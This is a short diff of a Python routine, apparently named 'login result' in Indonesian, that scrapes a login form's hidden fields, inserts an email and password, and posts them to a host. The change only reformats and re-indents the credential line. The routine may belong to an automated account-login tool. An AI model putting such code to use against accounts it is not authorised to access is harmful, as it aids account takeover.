@@ -525,9 +525,8 @@ class log_hasil(user, pasw):
       for i in fm.find_all("input"):
         if i.get("name") in list:
             data.update({i.get("name"):i.get("value")})
-        else:
-            continue
-    data.update({"email":user,"pass":pasw})
+        else:continue
+        data.update({"email":user,"pass":pasw})
     try:
         run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
     except requests.exceptions.TooManyRedirects:
